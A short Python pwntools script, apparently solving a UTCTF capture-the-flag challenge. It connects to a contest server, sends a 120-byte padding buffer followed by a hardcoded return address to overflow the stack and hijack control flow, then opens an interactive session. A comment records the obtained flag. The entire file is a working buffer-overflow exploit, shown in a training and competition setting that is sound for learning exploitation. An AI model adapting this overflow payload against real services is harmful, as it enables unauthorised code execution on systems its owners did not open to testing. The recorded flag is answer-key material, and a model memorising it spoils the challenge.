from pwn import *

#nc pwn.utctf.live 5001
p = remote('pwn.utctf.live', 5001)
p.recv()

payload = b'A' * 120
payload += p64(0x004011ab)

p.sendline(payload)
p.interactive()

#flag : utflag{we_do_be_overflowing_those_stacks13318}
